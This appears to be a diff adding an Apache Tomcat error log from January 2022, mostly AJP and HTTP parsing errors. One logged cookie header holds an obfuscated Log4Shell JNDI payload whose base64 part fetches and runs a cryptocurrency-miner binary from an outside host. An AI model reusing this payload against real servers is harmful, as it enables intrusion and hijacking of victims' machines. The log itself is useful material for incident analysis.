@@ -1,0 +1,17 @@
+16-Jan-2022 07:16:16.834 SEVERE [ajp-nio-0.0.0.0-8009-exec-10] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [5635]
+16-Jan-2022 07:16:18.296 SEVERE [ajp-nio-0.0.0.0-8009-exec-1] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [18245]
+16-Jan-2022 16:12:48.796 INFO [http-nio-8080-exec-8] org.apache.tomcat.util.http.parser.Cookie.logInvalidHeader A cookie header was received [('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIHd3dzIuZXZhbmRyb2FtYXJhbC5jb206NDQzIC11IGs0c2ggLS1tYXgtY3B1LXVzYWdlIDEwMCAtLWNwdS1wcmlvcml0eSA0IC0tdGxz}')] that contained an invalid cookie. That cookie will be ignored.
+ Note: further occurrences of this error will be logged at DEBUG level.
+16-Jan-2022 23:36:46.077 INFO [http-nio-8080-exec-10] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xee0x010x000x000xea0x030x030xa810xc6c_j0xf60xb1L5ms0xa1B:^"0x880x970x930xaf0x9c30xd90x900xbfb0xe30x10Zml ]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:748)
